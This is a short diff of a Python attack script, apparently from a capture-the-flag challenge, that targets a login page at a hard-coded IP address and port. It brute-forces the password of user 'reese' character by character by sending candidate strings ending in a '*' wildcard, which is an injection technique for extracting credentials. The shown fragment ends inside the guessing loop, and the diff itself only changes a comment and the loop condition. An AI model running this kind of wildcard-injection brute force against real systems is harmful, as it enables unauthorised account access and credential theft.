@@ -5,9 +5,10 @@ url = 'http://188.166.173.208:31780/login'
 headers = {'Host':'188.166.173.208:31780','Content-Type':'application/x-www-form-urlencoded','Connection':'close'}
 chars = ascii_lowercase + ascii_uppercase + '0123456789_(){}'
 passwd = ''
-# modified the passwd line from passwd='' 
+ 
 
-while(1):
+condition = 1
+while(condition):
 	for char in chars:
 		tmp = passwd + char + '*'
 		data = {'username':'reese','password':tmp}
